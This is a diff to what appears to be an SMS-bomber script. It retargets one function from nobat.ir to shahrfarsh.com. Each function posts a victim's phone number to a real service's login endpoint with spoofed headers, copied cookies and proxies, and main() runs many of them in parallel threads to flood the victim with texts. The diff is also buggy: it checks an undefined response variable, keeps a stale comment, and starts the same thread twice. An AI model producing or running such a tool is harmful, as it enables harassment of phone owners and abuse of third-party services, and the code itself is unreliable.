@@ -20,13 +20,13 @@ def snap(phone):
     except:
         print ("Error!")
 
-def nobatir(phone):
+def shahrfarsh(phone):
     #snap api
-    nobatH = {"Host": "nobat.ir", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://nobat.ir", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://nobat.ir/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
-    nobatD = {"cellphone":phone}
+    shahrfarshH = {"Host": "shahrfarsh.com", "content-length": "23", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "accept": "text/plain, */*; q=0.01", "origin": "https://shahrfarsh.com", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://shahrfarsh.com/Account/Login", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.5", "cookie": "_ga_25XGT76MQ4=GS1.1.1710782099.1.1.1710782102.0.0.0; _ga=GA1.1.346131967.1710782099; analytics_session_token=45930e77-9797-f9df-e403-62c9cd5a1ae3; analytics_token=1c97cd2e-1989-3af8-a51b-5ef0fa2b702c; yektanet_session_last_activity=3/18/2024; _yngt_iframe=1; _ga_BNFE2XCVSW=GS1.1.1710782099.1.1.1710782102.0.0.0; _yngt=1909d7c1-19183-337a2-24e53-3faff463156e5; _gid=GA1.2.1935994764.1710782101; _gat_gtag_UA_228759888_1=1; _ym_uid=1710782103776823843; _ym_d=1710782103; _ym_isad=2; _ym_visorc=w"}
+    shahrfarshD = {"cellphone":phone}
     try:
-        nobatR = requests.post("https://nobat.ir/api/public/patient/login/phone", headers=nobatH, json=nobatD, proxies=proxy)
-        if "OK" in nobatR.text:
+        nobatR = requests.post("https://shahrfarsh.com/Account/Login", headers=shahrfarshH, json=shahrfarshD, proxies=proxy)
+        if "OK" in shahrfarshR.text:
             print ("sended sms:)")
         else:
             print ("Error!")
@@ -196,7 +196,7 @@ def main():
         Thread(target=rubika, args=[phone]).start()
         Thread(target=torob, args=[phone]).start()
         Thread(target=bama, args=[phone]).start()
-        Thread(target=nobatir, args=[phone]).start()
+        Thread(target=shahrfarsh, args=[phone]).start()
         Thread(target=alopeyk, args=[phone]).start()
         Thread(target=shahrfarsh, args=[phone]).start()
         Thread(target=azki, args=[phone]).start()
